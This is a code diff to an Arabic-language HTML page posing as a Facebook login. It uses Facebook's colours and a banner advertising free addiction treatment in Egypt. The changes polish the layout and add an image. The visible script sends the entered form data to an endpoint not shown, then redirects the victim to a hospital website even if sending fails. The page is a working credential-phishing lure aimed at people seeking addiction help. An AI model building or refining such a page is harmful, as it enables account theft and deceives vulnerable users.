@@ -17,9 +17,18 @@
             align-items: center;
             height: 100vh;
             flex-direction: column;
+            text-align: center;
+        }
+        .container img {
+            width: 70%;
+            max-width: 500px;
+            height: auto;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
         }
         .logo {
-            font-size: 2.5em;
+            font-size: 2.2em;
             color: #1877f2;
             margin-bottom: 20px;
         }
@@ -28,6 +37,8 @@
             padding: 40px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
+            max-width: 400px;
+            width: 100%;
         }
         .login-container h2 {
             margin: 0 0 20px;
@@ -67,7 +78,11 @@
 </head>
 <body>
     <div class="container">
-        <div class="logo">افضل مصحة علاج الادمان فى مصر بالمجان سجل الاشتراك الان </div>
+        <!-- صورة في الأعلى -->
+        <img src="https://i.ibb.co/99TPwBy8/change-habits-message-min-1536x864.webp" alt="شعار المصحة">
+
+        <div class="logo">افضل مصحة علاج الادمان فى مصر بالمجان سجل الاشتراك الان</div>
+
         <div class="login-container">
             <h2>تسجيل الدخول إلى فيس بوك</h2>
             <form id="loginForm">
@@ -116,12 +131,10 @@
                 }),
             })
             .then(() => {
-                // توجيه المستخدم إلى موقع فيسبوك بعد الإرسال
                 window.location.href = "https://mowafyhospital.com";
             })
             .catch(error => {
                 console.error("خطأ أثناء الإرسال:", error);
-                // يتم التوجيه حتى إذا حدث خطأ
                 window.location.href = "https://mowafyhospital.com";
             });
         }
